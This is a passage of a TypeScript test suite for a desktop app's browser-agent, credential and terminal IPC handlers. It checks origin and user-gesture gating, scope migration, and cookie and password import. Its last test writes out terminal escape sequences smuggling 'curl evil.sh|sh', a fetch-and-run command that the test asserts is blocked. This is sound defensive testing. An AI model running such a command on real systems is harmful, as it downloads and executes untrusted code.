      invoke.get('browser-agent:set-panel-occluded')?.(activeAppEvent, true, 'chat-a', true)
    ).resolves.toBe(true)
    expect(deps.browserPanel.setOccluded).toHaveBeenLastCalledWith(
      activeSender.sender,
      true,
      'chat-a',
      true
    )

    await expect(
      invoke.get('browser-agent:set-panel-occluded')?.(activeAppEvent, 'yes', 'chat-a')
    ).resolves.toBe(false)
    await expect(
      invoke.get('browser-agent:set-panel-occluded')?.(activeAppEvent, true, 'chat-a', 'yes')
    ).resolves.toBe(false)
  })

  it('drops stale browser-panel bounds after another chat is activated', async () => {
    const { invoke, on } = collectHandlers()
    const bounds = { x: 100, y: 50, width: 800, height: 600 }

    await invoke.get('browser-agent:activate-scope')?.(appEvent, 'chat-b')
    on.get('browser-agent:set-panel-bounds')?.(appEvent, bounds, null, 'chat-a')
    expect(deps.browserPanel.setBounds).not.toHaveBeenCalled()

    on.get('browser-agent:set-panel-bounds')?.(appEvent, bounds, null, 'chat-b')
    expect(deps.browserPanel.setBounds).toHaveBeenCalledWith(appSender, bounds, undefined, 'chat-b')
  })

  it('keeps download metadata chat-scoped and gates Finder actions on user input', async () => {
    const state = {
      scopeId: 'chat-b',
      downloads: [
        {
          id: 'download-1',
          filename: 'report.csv',
          state: 'completed' as const,
          receivedBytes: 100,
          totalBytes: 100,
          startedAt: '2026-07-31T12:00:00.000Z',
        },
      ],
    }
    const getState = vi.spyOn(browserSession, 'getBrowserDownloadsState').mockReturnValue(state)
    const showMenu = vi.spyOn(browserSession, 'showBrowserDownloadsMenu').mockReturnValue(true)
    const showToolbar = vi.spyOn(browserDriver, 'showToolbarMenu').mockReturnValue(true)
    const showInFolder = vi
      .spyOn(browserSession, 'showBrowserDownloadInFolder')
      .mockReturnValue(true)
    const { invoke } = collectHandlers()

    await invoke.get('browser-agent:activate-scope')?.(activeAppEvent, 'chat-b')
    await expect(
      invoke.get('browser-agent:get-downloads-state')?.(activeAppEvent, 'chat-a')
    ).resolves.toEqual({ downloads: [] })
    await expect(
      invoke.get('browser-agent:get-downloads-state')?.(activeAppEvent, 'chat-b')
    ).resolves.toEqual(state)
    expect(getState).toHaveBeenCalledWith('chat-b')

    await expect(
      invoke.get('browser-agent:show-downloads-menu')?.(
        inactiveAppEvent,
        { x: 10, y: 20 },
        'chat-b'
      )
    ).resolves.toBe(false)
    await expect(
      invoke.get('browser-agent:show-downloads-menu')?.(activeAppEvent, { x: 10, y: 20 }, 'chat-b')
    ).resolves.toBe(true)
    expect(showMenu).toHaveBeenCalledWith('chat-b', FAKE_WINDOW, { x: 10, y: 20 })

    await expect(
      invoke.get('browser-agent:show-toolbar-menu')?.(activeAppEvent, { x: 30, y: 40 }, 'chat-b')
    ).resolves.toBe(true)
    expect(showToolbar).toHaveBeenCalledWith('chat-b', FAKE_WINDOW, { x: 30, y: 40 })

    await expect(
      invoke.get('browser-agent:show-download-in-folder')?.(
        inactiveAppEvent,
        'download-1',
        'chat-b'
      )
    ).resolves.toBe(false)
    await expect(
      invoke.get('browser-agent:show-download-in-folder')?.(activeAppEvent, 'download-1', 'chat-b')
    ).resolves.toBe(true)
    expect(showInFolder).toHaveBeenCalledWith('chat-b', 'download-1')

    getState.mockRestore()
    showMenu.mockRestore()
    showToolbar.mockRestore()
    showInFolder.mockRestore()
  })

  it('restores only the browser scope active for that renderer', async () => {
    const tabsState = {
      scopeId: 'chat-b',
      tabs: [
        {
          tabId: '1',
          url: 'https://restored.example/',
          title: 'Restored',
          loading: false,
          active: true,
          pinned: false,
        },
      ],
      activeTabId: '1',
    }
    const restore = vi.spyOn(browserDriver, 'restoreBrowserScope').mockReturnValue(tabsState)
    const { invoke } = collectHandlers()

    await invoke.get('browser-agent:activate-scope')?.(appEvent, 'chat-b')
    await expect(invoke.get('browser-agent:restore-scope')?.(appEvent, 'chat-a')).resolves.toEqual({
      tabs: [],
      activeTabId: null,
    })
    await expect(invoke.get('browser-agent:restore-scope')?.(appEvent, 'chat-b')).resolves.toEqual(
      tabsState
    )
    expect(restore).toHaveBeenCalledOnce()
    expect(restore).toHaveBeenCalledWith('chat-b')

    restore.mockRestore()
  })

  it('creates browser tabs through an acknowledged active-scope operation', async () => {
    const tabsState = {
      scopeId: 'chat-b',
      tabs: [
        {
          tabId: '2',
          url: '',
          title: '',
          loading: false,
          active: true,
          pinned: false,
        },
      ],
      activeTabId: '2',
    }
    const add = vi.spyOn(browserSession, 'addTab').mockReturnValue({} as never)
    const peek = vi.spyOn(browserSession, 'peekTabsState').mockReturnValue(tabsState)
    const { invoke } = collectHandlers()

    await invoke.get('browser-agent:activate-scope')?.(appEvent, 'chat-b')
    peek.mockClear()
    await expect(invoke.get('browser-agent:open-tab')?.(appEvent, 'chat-b')).resolves.toEqual(
      tabsState
    )
    await expect(invoke.get('browser-agent:open-tab')?.(evilEvent, 'chat-b')).resolves.toEqual({
      scopeId: '',
      tabs: [],
      activeTabId: null,
    })

    expect(add).toHaveBeenCalledOnce()
    expect(peek).toHaveBeenCalledOnce()
    add.mockRestore()
    peek.mockRestore()
  })

  it('routes browser scope events after activation and a valid provisional migration', async () => {
    const migrate = vi.spyOn(browserDriver, 'migrateBrowserScope').mockReturnValue(true)
    const { invoke } = collectHandlers()

    await invoke.get('browser-agent:activate-scope')?.(appEvent, 'pending:new')
    expect(deps.scopeEvents.activateBrowser).toHaveBeenCalledWith(appSender, 'pending:new')

    await invoke.get('browser-agent:migrate-scope')?.(appEvent, 'pending:new', 'chat-durable')
    expect(migrate).toHaveBeenCalledOnce()
    expect(migrate).toHaveBeenCalledWith('pending:new', 'chat-durable')
    expect(deps.scopeEvents.activateBrowser).toHaveBeenLastCalledWith(appSender, 'chat-durable')

    migrate.mockRestore()
  })

  it('migrates an owned hidden browser scope without changing the visible chat route', async () => {
    const migrate = vi.spyOn(browserDriver, 'migrateBrowserScope').mockReturnValue(true)
    const { invoke, on } = collectHandlers()
    const bounds = { x: 100, y: 50, width: 800, height: 600 }
    const migrateScope = invoke.get('browser-agent:migrate-scope')

    await invoke.get('browser-agent:activate-scope')?.(appEvent, 'pending:hidden')
    await invoke.get('browser-agent:activate-scope')?.(appEvent, 'chat-visible')
    await migrateScope?.(appEvent, 'pending:hidden', 'chat-durable')

    expect(migrate).toHaveBeenCalledOnce()
    expect(deps.scopeEvents.activateBrowser).toHaveBeenLastCalledWith(appSender, 'chat-visible')
    expect(deps.scopeEvents.activateBrowser).not.toHaveBeenCalledWith(appSender, 'chat-durable')

    on.get('browser-agent:set-panel-bounds')?.(appEvent, bounds, null, 'chat-visible')
    expect(deps.browserPanel.setBounds).toHaveBeenCalledWith(
      appSender,
      bounds,
      undefined,
      'chat-visible'
    )

    await expect(migrateScope?.(appEvent, 'pending:hidden', 'chat-replay')).resolves.toEqual({
      tabs: [],
      activeTabId: null,
    })
    expect(migrate).toHaveBeenCalledOnce()

    migrate.mockRestore()
  })

  it('denies browser scope rekeys unless the sender owns a provisional source', async () => {
    const migrate = vi.spyOn(browserDriver, 'migrateBrowserScope').mockReturnValue(true)
    const { invoke } = collectHandlers()
    const migrateScope = invoke.get('browser-agent:migrate-scope')

    await expect(migrateScope?.(appEvent, 'pending:not-active', 'chat-durable')).resolves.toEqual({
      tabs: [],
      activeTabId: null,
    })

    await invoke.get('browser-agent:activate-scope')?.(appEvent, 'pending:active')
    await expect(migrateScope?.(appEvent, 'pending:active', 'pending:other')).resolves.toEqual({
      tabs: [],
      activeTabId: null,
    })
    await expect(migrateScope?.(appEvent, 'pending:active', 'not valid!')).resolves.toEqual({
      tabs: [],
      activeTabId: null,
    })
    await expect(migrateScope?.(appEvent, 'chat-durable', 'chat-other')).resolves.toEqual({
      tabs: [],
      activeTabId: null,
    })

    expect(migrate).not.toHaveBeenCalled()
    expect(deps.scopeEvents.activateBrowser).toHaveBeenCalledTimes(1)

    migrate.mockRestore()
  })

  it('keeps the browser sender on its provisional scope when migration fails', async () => {
    const migrate = vi.spyOn(browserDriver, 'migrateBrowserScope').mockReturnValue(false)
    const { invoke, on } = collectHandlers()
    const bounds = { x: 100, y: 50, width: 800, height: 600 }

    await invoke.get('browser-agent:activate-scope')?.(appEvent, 'pending:active')
    await invoke.get('browser-agent:migrate-scope')?.(appEvent, 'pending:active', 'chat-durable')
    on.get('browser-agent:set-panel-bounds')?.(appEvent, bounds, null, 'pending:active')

    expect(deps.browserPanel.setBounds).toHaveBeenCalledWith(
      appSender,
      bounds,
      undefined,
      'pending:active'
    )
    expect(deps.scopeEvents.activateBrowser).not.toHaveBeenCalledWith(appSender, 'chat-durable')

    migrate.mockRestore()
  })

  it('only disposes provisional browser scopes from the app origin', async () => {
    const { invoke } = collectHandlers()
    const dispose = invoke.get('browser-agent:dispose-scope')

    expect(await dispose?.(evilEvent, 'pending:new')).toBe(false)
    expect(await dispose?.(appEvent, 'chat-durable')).toBe(false)
    expect(await dispose?.(appEvent, 'pending:new')).toBe(true)
  })

  it('disposes provisional native scopes when their renderer fully navigates away', async () => {
    const listeners = new Map<string, (...args: unknown[]) => void>()
    const sender = {
      session: appSender.session,
      isDestroyed: () => false,
      on: (channel: string, listener: (...args: unknown[]) => void) => {
        listeners.set(channel, listener)
      },
    }
    const event = {
      senderFrame: { url: `${APP}/workspace/ws1` },
      sender,
    } as unknown as Parameters<Handler>[0]
    const disposeBrowser = vi.spyOn(browserDriver, 'disposeBrowserScope')
    const disposeTerminal = vi.spyOn(deps.terminal, 'disposeScope')
    const { invoke } = collectHandlers()

    await invoke.get('browser-agent:activate-scope')?.(event, 'pending:reload')
    await invoke.get('terminal:activate-scope')?.(event, 'pending:reload')

    listeners.get('did-start-navigation')?.({}, 'https://sim.ai/next', true, true)
    expect(disposeBrowser).not.toHaveBeenCalled()
    expect(disposeTerminal).not.toHaveBeenCalled()

    listeners.get('did-start-navigation')?.({}, 'https://sim.ai/next', false, true)
    expect(disposeBrowser).toHaveBeenCalledWith('pending:reload')
    expect(disposeTerminal).toHaveBeenCalledWith('pending:reload')

    disposeBrowser.mockRestore()
  })

  it('suspends only durable browser scopes from the app origin', async () => {
    const suspendScope = vi.spyOn(browserDriver, 'suspendBrowserScope').mockReturnValue(true)
    const { invoke } = collectHandlers()
    const suspend = invoke.get('browser-agent:suspend-scope')

    expect(await suspend?.(evilEvent, 'chat-durable')).toBe(false)
    expect(await suspend?.(appEvent, 'not valid!')).toBe(false)
    expect(await suspend?.(appEvent, 'pending:new')).toBe(false)
    expect(await suspend?.(appEvent, 'chat-durable')).toBe(true)
    expect(suspendScope).toHaveBeenCalledOnce()
    expect(suspendScope).toHaveBeenCalledWith('chat-durable')
    expect(deps.scopeEvents.sendBrowser).toHaveBeenCalledWith(
      'chat-durable',
      'browser-agent:scope-suspended',
      'chat-durable'
    )

    suspendScope.mockRestore()
  })

  it('forwards a well-formed panel anchor and drops a malformed one', () => {
    const { on } = collectHandlers()
    const handler = on.get('browser-agent:set-panel-bounds')
    const bounds = { x: 100, y: 50, width: 800, height: 600 }
    const anchor = { viewportWidth: 1600, viewportHeight: 900, widthRatio: 0.5 }

    handler?.(appEvent, bounds, anchor, 'chat-a')
    expect(deps.browserPanel.setBounds).toHaveBeenLastCalledWith(
      appSender,
      bounds,
      anchor,
      'chat-a'
    )

    // A bad anchor must not take the bounds down with it — the rect still
    // applies, the shell just loses the resize optimization.
    handler?.(appEvent, bounds, { ...anchor, widthRatio: Number.NaN }, 'chat-a')
    expect(deps.browserPanel.setBounds).toHaveBeenLastCalledWith(
      appSender,
      bounds,
      undefined,
      'chat-a'
    )
    handler?.(appEvent, bounds, { ...anchor, viewportWidth: 0 }, 'chat-a')
    expect(deps.browserPanel.setBounds).toHaveBeenLastCalledWith(
      appSender,
      bounds,
      undefined,
      'chat-a'
    )
    handler?.(appEvent, bounds, 'nonsense', 'chat-a')
    expect(deps.browserPanel.setBounds).toHaveBeenLastCalledWith(
      appSender,
      bounds,
      undefined,
      'chat-a'
    )
  })

  it('restricts browser theme updates to known app-origin preferences', () => {
    const { on } = collectHandlers()
    const handler = on.get('browser-agent:set-theme')

    expect(() => handler?.(evilEvent, 'dark')).not.toThrow()
    expect(() => handler?.(appEvent, 'sepia')).not.toThrow()
    expect(() => handler?.(appEvent, 'system')).not.toThrow()
  })

  it('restricts Chrome profile discovery to the app origin', async () => {
    const { invoke } = collectHandlers()
    const handler = invoke.get('browser-import:list-profiles')

    expect(await handler?.(evilEvent)).toEqual([])
    expect(await handler?.(fileEvent)).toEqual([])
    expect(listChromeImportProfiles).not.toHaveBeenCalled()

    expect(await handler?.(appEvent)).toEqual([{ id: 'Default', label: 'Person 1' }])
  })

  it('requires a live user gesture before importing Chrome cookies', async () => {
    const { invoke } = collectHandlers()
    const handler = invoke.get('browser-import:cookies')

    // Reading someone's Chrome cookies is a user decision. Without an active
    // gesture the call is refused before it can reach the Keychain, so a
    // scripted or compromised renderer cannot start an import on its own.
    expect(await handler?.(inactiveAppEvent, 'Default')).toEqual({
      cookiesImported: 0,
      cookiesSkipped: 0,
      error: 'unknown',
    })
    expect(importChromeCookies).not.toHaveBeenCalled()

    expect(await handler?.(activeAppEvent, 'Default')).toEqual({
      cookiesImported: 3,
      cookiesSkipped: 1,
    })
    expect(importChromeCookies).toHaveBeenCalledWith('Default')
  })

  it('never imports Chrome cookies for a foreign origin', async () => {
    const { invoke } = collectHandlers()

    expect(await invoke.get('browser-import:cookies')?.(evilEvent, 'Default')).toMatchObject({
      error: 'unknown',
    })
    expect(importChromeCookies).not.toHaveBeenCalled()
  })

  it('refuses Chrome import while the browser surface is switched off', async () => {
    deps.settings.getPreferences = vi.fn(() => ({
      ...DEFAULT_DESKTOP_PREFERENCES,
      browserEnabled: false,
    }))
    const { invoke } = collectHandlers()

    expect(await invoke.get('browser-import:list-profiles')?.(appEvent)).toEqual([])
    expect(await invoke.get('browser-import:cookies')?.(activeAppEvent, 'Default')).toMatchObject({
      error: 'unknown',
    })
    expect(
      await invoke.get('browser-credentials:list-fill-options')?.(activeAppEvent, 'chat-a')
    ).toEqual([])
    expect(
      await invoke.get('browser-credentials:fill-selected')?.(activeAppEvent, 'c1', 'chat-a')
    ).toBe(false)
    expect(listChromeImportProfiles).not.toHaveBeenCalled()
    expect(importChromeCookies).not.toHaveBeenCalled()
    expect(mockCoordinator.listFillOptions).not.toHaveBeenCalled()
    expect(mockCoordinator.fillCredential).not.toHaveBeenCalled()
  })

  it('refuses a malformed profile id rather than importing the default profile', async () => {
    const { invoke } = collectHandlers()

    expect(await invoke.get('browser-import:cookies')?.(activeAppEvent, 42)).toEqual({
      cookiesImported: 0,
      cookiesSkipped: 0,
      error: 'unknown',
    })
    expect(importChromeCookies).not.toHaveBeenCalled()
  })

  it('imports the default profile when the page names none', async () => {
    const { invoke } = collectHandlers()

    await invoke.get('browser-import:cookies')?.(activeAppEvent, undefined)
    expect(importChromeCookies).toHaveBeenCalledWith(undefined)
  })

  it('exposes exactly one channel that can return a password', async () => {
    // The structural guarantee behind the credential design. Reveal is the one
    // deliberate exception, so the channel list is pinned here: a new way to
    // get plaintext out of the main process has to break this test first.
    const { invoke, on } = collectHandlers()
    const credentialChannels = [...invoke.keys(), ...on.keys()].filter((channel) =>
      channel.startsWith('browser-credentials:')
    )

    expect(credentialChannels.sort()).toEqual([
      'browser-credentials:available',
      'browser-credentials:copy',
      'browser-credentials:fill-selected',
      'browser-credentials:forget',
      'browser-credentials:forget-all',
      'browser-credentials:form-state',
      'browser-credentials:import',
      'browser-credentials:list',
      'browser-credentials:list-fill-options',
      'browser-credentials:reveal',
      'browser-credentials:show-chooser',
    ])

    const listed = (await invoke.get('browser-credentials:list')?.(appEvent)) as Array<
      Record<string, unknown>
    >
    expect(listed.every((credential) => !('password' in credential))).toBe(true)

    const fillOptions = (await invoke.get('browser-credentials:list-fill-options')?.(
      appEvent
    )) as Array<Record<string, unknown>>
    expect(fillOptions.every((credential) => !('password' in credential))).toBe(true)
  })

  it('requires origin and a live gesture before revealing or copying a password', async () => {
    const { invoke } = collectHandlers()
    const revealHandler = invoke.get('browser-credentials:reveal')
    const copyHandler = invoke.get('browser-credentials:copy')

    expect(await revealHandler?.(evilEvent, 'c1')).toBeNull()
    expect(await revealHandler?.(inactiveAppEvent, 'c1')).toBeNull()
    expect(await copyHandler?.(evilEvent, 'c1')).toBe(false)
    expect(await copyHandler?.(inactiveAppEvent, 'c1')).toBe(false)
    expect(revealCredential).not.toHaveBeenCalled()
    expect(copyCredential).not.toHaveBeenCalled()

    expect(await revealHandler?.(activeAppEvent, 'c1')).toBe('hunter2')
    expect(revealCredential).toHaveBeenCalledWith('c1')
  })

  it('requires a live user gesture before deleting every password', async () => {
    const { invoke } = collectHandlers()
    const handler = invoke.get('browser-credentials:forget-all')

    expect(await handler?.(evilEvent)).toEqual([])
    expect(await handler?.(inactiveAppEvent)).toEqual([])
    expect(forgetAllCredentials).not.toHaveBeenCalled()

    await handler?.(activeAppEvent)
    expect(forgetAllCredentials).toHaveBeenCalled()
  })

  it('refuses a reveal for anything that is not a credential id', async () => {
    const { invoke } = collectHandlers()

    expect(
      await invoke.get('browser-credentials:reveal')?.(activeAppEvent, { id: 'c1' })
    ).toBeNull()
    expect(revealCredential).not.toHaveBeenCalled()
  })

  it('accepts login-form reports only from the built-in browseritself', async () => {
    const { on } = collectHandlers()
    const handler = on.get('browser-credentials:form-state')
    const report = {
      origin: 'https://example.com',
      hasLoginForm: true,
      hasPasswordField: false,
    }
    const browserPageEvent = {
      senderFrame: { url: 'https://example.com/login' },
      sender: { isBrowserTab: true },
    }

    // An arbitrary website, and even the Sim app itself, cannot claim a page
    // has a login form — only the browser tab's own preload can.
    handler?.(evilEvent, report)
    handler?.(appEvent, report)
    expect(mockCoordinator.noteFormState).not.toHaveBeenCalled()

    handler?.(browserPageEvent, report)
    expect(mockCoordinator.noteFormState).toHaveBeenCalledWith(browserPageEvent.sender, report)
  })

  it('ignores a malformed login-form report', () => {
    const { on } = collectHandlers()
    const handler = on.get('browser-credentials:form-state')
    const browserPageEvent = {
      senderFrame: { url: 'https://x.test/' },
      sender: { isBrowserTab: true },
    }

    handler?.(browserPageEvent, 'nonsense')
    handler?.(browserPageEvent, { origin: 42, hasLoginForm: true })
    handler?.(browserPageEvent, { origin: 'https://x.test', hasLoginForm: 'yes' })
    handler?.(browserPageEvent, {
      origin: 'https://x.test',
      hasLoginForm: true,
      hasPasswordField: 'yes',
    })

    expect(mockCoordinator.noteFormState).not.toHaveBeenCalled()
  })

  it('requires a live user gesture before opening the credential chooser', async () => {
    const { invoke } = collectHandlers()
    const handler = invoke.get('browser-credentials:show-chooser')
    const anchor = { x: 10, y: 20 }

    expect(await handler?.(evilEvent, anchor)).toBe(false)
    expect(await handler?.(inactiveAppEvent, anchor)).toBe(false)
    expect(mockCoordinator.showChooser).not.toHaveBeenCalled()

    await invoke.get('browser-agent:activate-scope')?.(activeChooserEvent, 'chat-a')
    expect(await handler?.(activeChooserEvent, anchor, 'chat-a')).toBe(true)
    expect(mockCoordinator.showChooser).toHaveBeenCalledWith(FAKE_WINDOW, anchor, 'chat-a')
  })

  it('lists and fills only for the renderer-active browser scope', async () => {
    const { invoke } = collectHandlers()
    const list = invoke.get('browser-credentials:list-fill-options')
    const fill = invoke.get('browser-credentials:fill-selected')

    expect(await list?.(evilEvent, 'chat-a')).toEqual([])
    expect(mockCoordinator.listFillOptions).not.toHaveBeenCalled()

    await invoke.get('browser-agent:activate-scope')?.(activeAppEvent, 'chat-a')
    expect(await list?.(activeAppEvent, 'chat-b')).toEqual([])
    expect(await list?.(activeAppEvent, 'chat-a')).toEqual([
      expect.objectContaining({ id: 'c1', username: 'ada' }),
    ])
    expect(mockCoordinator.listFillOptions).toHaveBeenCalledWith('chat-a')

    expect(await fill?.(inactiveAppEvent, 'c1', 'chat-a')).toBe(false)
    expect(await fill?.(activeAppEvent, 'not valid!', 'chat-a')).toBe(false)
    expect(mockCoordinator.fillCredential).not.toHaveBeenCalled()

    expect(await fill?.(activeAppEvent, 'c1', 'chat-a')).toBe(true)
    expect(mockCoordinator.fillCredential).toHaveBeenCalledWith('c1', 'chat-a')
  })

  it('refuses a chooser anchor that is not a real point', async () => {
    const { invoke } = collectHandlers()
    const handler = invoke.get('browser-credentials:show-chooser')

    expect(await handler?.(activeChooserEvent, { x: 'left', y: 2 })).toBe(false)
    expect(await handler?.(activeChooserEvent, { x: Number.NaN, y: 2 })).toBe(false)
    expect(await handler?.(activeChooserEvent, null)).toBe(false)
    expect(mockCoordinator.showChooser).not.toHaveBeenCalled()
  })

  it('requires a live user gesture before importing or forgetting passwords', async () => {
    const { invoke } = collectHandlers()

    expect(
      await invoke.get('browser-credentials:import')?.(inactiveAppEvent, 'Default')
    ).toMatchObject({ error: 'unknown' })
    await invoke.get('browser-credentials:forget')?.(inactiveAppEvent, 'c1')
    expect(importChromePasswords).not.toHaveBeenCalled()
    expect(forgetCredential).not.toHaveBeenCalled()

    await invoke.get('browser-credentials:import')?.(activeAppEvent, 'Default', 'replace')
    await invoke.get('browser-credentials:forget')?.(activeAppEvent, 'c1')
    expect(importChromePasswords).toHaveBeenCalledWith('Default', 'replace')
    expect(forgetCredential).toHaveBeenCalledWith('c1')
  })

  it('always forwards the replies the PTY solicits', () => {
    const { on } = collectHandlers()
    const write = vi.spyOn(deps.terminal, 'write').mockImplementation(() => {})

    // The PTY asks for these and the terminal must answer with no user input:
    // DSR cursor position, device attributes, a focus report (mode 1004, set by
    // tmux and vim), an SGR mouse report. Gating them would hang whatever asked.
    const replies = ['\u001b[24;80R', '\u001b[?62;c', '\u001b[I', '\u001b[<0;10;5M']
    for (const reply of replies) {
      on.get('terminal:write')?.(inactiveAppEvent, 't1', reply, 'chat-a')
      expect(write).toHaveBeenCalledWith('chat-a', 't1', reply)
    }
    expect(write).toHaveBeenCalledTimes(replies.length)
  })

  it('keeps explicitly scoped terminal input in its owning chat', async () => {
    const { invoke, on } = collectHandlers()
    const write = vi.spyOn(deps.terminal, 'write').mockImplementation(() => {})

    await invoke.get('terminal:activate-scope')?.(appEvent, 'chat-b')
    on.get('terminal:write')?.(appEvent, 't1', '\u001b[I', 'chat-a')
    expect(write).toHaveBeenCalledWith('chat-a', 't1', '\u001b[I')

    on.get('terminal:write')?.(appEvent, 't1', '\u001b[I', 'chat-b')
    expect(write).toHaveBeenCalledWith('chat-b', 't1', '\u001b[I')
  })

  it('clears retained terminal output only for an app-owned scope', async () => {
    const { invoke } = collectHandlers()
    const clearScrollback = vi.spyOn(deps.terminal, 'clearScrollback').mockReturnValue(true)
    const handler = invoke.get('terminal:clear-scrollback')

    await expect(handler?.(evilEvent, 't1', 'chat-b')).resolves.toBe(false)
    await expect(handler?.(appEvent, 't1', 'chat-b')).resolves.toBe(true)

    expect(clearScrollback).toHaveBeenCalledOnce()
    expect(clearScrollback).toHaveBeenCalledWith('chat-b', 't1')
  })

  it('routes terminal scope events after activation and a valid provisional migration', async () => {
    const migrate = vi.spyOn(deps.terminal, 'migrateScope').mockReturnValue(true)
    const { invoke } = collectHandlers()

    await invoke.get('terminal:activate-scope')?.(appEvent, 'pending:new')
    expect(deps.scopeEvents.activateTerminal).toHaveBeenCalledWith(appSender, 'pending:new')

    await invoke.get('terminal:migrate-scope')?.(appEvent, 'pending:new', 'chat-durable')
    expect(migrate).toHaveBeenCalledOnce()
    expect(migrate).toHaveBeenCalledWith('pending:new', 'chat-durable')
    expect(deps.scopeEvents.activateTerminal).toHaveBeenLastCalledWith(appSender, 'chat-durable')
  })

  it('migrates an owned hidden terminal scope without changing the visible chat route', async () => {
    const migrate = vi.spyOn(deps.terminal, 'migrateScope').mockReturnValue(true)
    const { invoke } = collectHandlers()
    const migrateScope = invoke.get('terminal:migrate-scope')

    await invoke.get('terminal:activate-scope')?.(appEvent, 'pending:hidden')
    await invoke.get('terminal:activate-scope')?.(appEvent, 'chat-visible')
    await migrateScope?.(appEvent, 'pending:hidden', 'chat-durable')

    expect(migrate).toHaveBeenCalledOnce()
    expect(deps.scopeEvents.activateTerminal).toHaveBeenLastCalledWith(appSender, 'chat-visible')
    expect(deps.scopeEvents.activateTerminal).not.toHaveBeenCalledWith(appSender, 'chat-durable')

    await expect(migrateScope?.(appEvent, 'pending:hidden', 'chat-replay')).resolves.toEqual({
      tabs: [],
      activeTerminalId: null,
    })
    expect(migrate).toHaveBeenCalledOnce()
  })

  it('denies terminal scope rekeys unless the sender owns a provisional source', async () => {
    const migrate = vi.spyOn(deps.terminal, 'migrateScope').mockReturnValue(true)
    const { invoke } = collectHandlers()
    const migrateScope = invoke.get('terminal:migrate-scope')

    await expect(migrateScope?.(appEvent, 'pending:not-active', 'chat-durable')).resolves.toEqual({
      tabs: [],
      activeTerminalId: null,
    })

    await invoke.get('terminal:activate-scope')?.(appEvent, 'pending:active')
    await expect(migrateScope?.(appEvent, 'pending:active', 'pending:other')).resolves.toEqual({
      tabs: [],
      activeTerminalId: null,
    })
    await expect(migrateScope?.(appEvent, 'pending:active', 'not valid!')).resolves.toEqual({
      tabs: [],
      activeTerminalId: null,
    })
    await expect(migrateScope?.(appEvent, 'chat-durable', 'chat-other')).resolves.toEqual({
      tabs: [],
      activeTerminalId: null,
    })

    expect(migrate).not.toHaveBeenCalled()
    expect(deps.scopeEvents.activateTerminal).toHaveBeenCalledTimes(1)
  })

  it('keeps the terminal sender on its provisional scope when migration fails', async () => {
    const migrate = vi.spyOn(deps.terminal, 'migrateScope').mockReturnValue(false)
    const { invoke } = collectHandlers()

    await invoke.get('terminal:activate-scope')?.(appEvent, 'pending:active')
    await expect(
      invoke.get('terminal:migrate-scope')?.(appEvent, 'pending:active', 'chat-durable')
    ).resolves.toEqual({ tabs: [], activeTerminalId: null })

    migrate.mockReturnValue(true)
    await invoke.get('terminal:migrate-scope')?.(appEvent, 'pending:active', 'chat-retry')
    expect(migrate).toHaveBeenNthCalledWith(2, 'pending:active', 'chat-retry')
    expect(deps.scopeEvents.activateTerminal).toHaveBeenLastCalledWith(appSender, 'chat-retry')
  })

  it('only disposes provisional terminal scopes from the app origin', async () => {
    const { invoke } = collectHandlers()
    const disposeScope = vi.spyOn(deps.terminal, 'disposeScope')
    const dispose = invoke.get('terminal:dispose-scope')

    expect(await dispose?.(evilEvent, 'pending:new')).toBe(false)
    expect(await dispose?.(appEvent, 'chat-durable')).toBe(false)
    expect(await dispose?.(appEvent, 'pending:new')).toBe(true)
    expect(disposeScope).toHaveBeenCalledOnce()
    expect(disposeScope).toHaveBeenCalledWith('pending:new')
  })

  it('suspends only durable terminal scopes from the app origin', async () => {
    const suspendScope = vi.spyOn(deps.terminal, 'suspendScope').mockReturnValue(true)
    const { invoke } = collectHandlers()
    const suspend = invoke.get('terminal:suspend-scope')

    expect(await suspend?.(evilEvent, 'chat-durable')).toBe(false)
    expect(await suspend?.(appEvent, 'not valid!')).toBe(false)
    expect(await suspend?.(appEvent, 'pending:new')).toBe(false)
    expect(await suspend?.(appEvent, 'chat-durable')).toBe(true)
    expect(suspendScope).toHaveBeenCalledOnce()
    expect(suspendScope).toHaveBeenCalledWith('chat-durable')
    expect(deps.scopeEvents.sendTerminal).toHaveBeenCalledWith(
      'chat-durable',
      'terminal:scope-suspended',
      'chat-durable'
    )
  })

  it('pastes the clipboard from main rather than taking bytes from the caller', async () => {
    const { invoke } = collectHandlers()
    const write = vi.spyOn(deps.terminal, 'write').mockImplementation(() => {})
    vi.mocked(clipboard.readText).mockReturnValue('echo hi')

    await expect(invoke.get('terminal:paste')?.(activeAppEvent, 't1', 'chat-a')).resolves.toBe(true)

    expect(write).toHaveBeenCalledWith('chat-a', 't1', 'echo hi')
  })

  it('refuses a paste with no gesture behind it, and reports an empty clipboard', async () => {
    const { invoke } = collectHandlers()
    const write = vi.spyOn(deps.terminal, 'write').mockImplementation(() => {})
    vi.mocked(clipboard.readText).mockReturnValue('echo hi')

    expect(await invoke.get('terminal:paste')?.(inactiveAppEvent, 't1', 'chat-a')).toBe(false)
    expect(write).not.toHaveBeenCalled()

    vi.mocked(clipboard.readText).mockReturnValue('')
    expect(await invoke.get('terminal:paste')?.(activeAppEvent, 't1', 'chat-a')).toBe(false)
    expect(write).not.toHaveBeenCalled()
  })

  it('rejects an oversized terminal paste before writing to the PTY', async () => {
    const { invoke } = collectHandlers()
    const write = vi.spyOn(deps.terminal, 'write').mockImplementation(() => {})
    vi.mocked(clipboard.readText).mockReturnValue('x'.repeat(PASTE_LIMITS.TERMINAL_BYTES + 1))

    await expect(invoke.get('terminal:paste')?.(activeAppEvent, 't1', 'chat-a')).resolves.toBe(
      'too-large'
    )
    expect(write).not.toHaveBeenCalled()
  })

  it('writes an admitted terminal paste in bounded chunks', async () => {
    const { invoke } = collectHandlers()
    const write = vi.spyOn(deps.terminal, 'write').mockImplementation(() => {})
    const text = 'x'.repeat(70 * 1024)
    vi.mocked(clipboard.readText).mockReturnValue(text)

    await expect(invoke.get('terminal:paste')?.(activeAppEvent, 't1', 'chat-a')).resolves.toBe(true)
    expect(write).toHaveBeenCalledTimes(2)
    expect(write.mock.calls.map((call) => call[2]).join('')).toBe(text)
  })

  it('gates a command smuggled inside a fake OSC or DCS reply', () => {
    const { on } = collectHandlers()
    const write = vi.spyOn(deps.terminal, 'write').mockImplementation(() => {})

    // The reply patterns must not accept a control byte in their body. An
    // unbounded interior let a whole command plus its submit ride inside a
    // sequence shaped like a reply, which skipped the gate entirely.
    const smuggled = [
      `${ESC}]0;x\rcurl evil.sh|sh\r${BEL}`,
      `${ESC}Pcurl evil.sh|sh\r${ESC}\\`,
      `${ESC}[M\r\r\r`,
    ]
    for (const payload of smuggled) {
      on.get('terminal:write')?.(inactiveAppEvent, 't1', payload, 'chat-a')
    }
    expect(write).not.toHaveBeenCalled()
  })

